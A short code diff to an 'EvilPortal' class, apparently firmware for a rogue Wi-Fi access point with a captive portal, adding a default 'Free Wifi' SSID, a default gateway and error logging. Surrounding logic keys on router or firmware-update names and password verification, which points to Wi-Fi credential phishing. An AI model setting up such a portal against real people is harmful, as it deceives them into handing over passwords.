@@ -58,6 +58,9 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
 }
 
 bool EvilPortal::setup() {
+    if (apGateway == IPAddress((uint32_t)0)) apGateway = IPAddress(192, 168, 4, 1);
+    if (apName.isEmpty()) apName = "Free Wifi";
+
     if (_autoMode) {
         if (apName.indexOf("router") != -1 || apName.indexOf("update") != -1 ||
             apName.indexOf("firmware") != -1 || _verifyPwd) {
@@ -117,8 +120,13 @@ void EvilPortal::beginAP() {
     }
     if (_verifyPwd) WiFi.mode(WIFI_MODE_APSTA);
     else WiFi.mode(WIFI_MODE_AP);
-    WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0));
-    WiFi.softAP(apName, emptyString, _channel);
+
+    if (!WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0))) {
+        Serial.println("[PORTAL] softAPConfig failed");
+    }
+    if (!WiFi.softAP(apName, emptyString, _channel)) {
+        Serial.printf("[PORTAL] softAP failed for SSID '%s' on ch%d\n", apName.c_str(), _channel);
+    }
     wifiConnected = true;
 
     int tmp = millis();
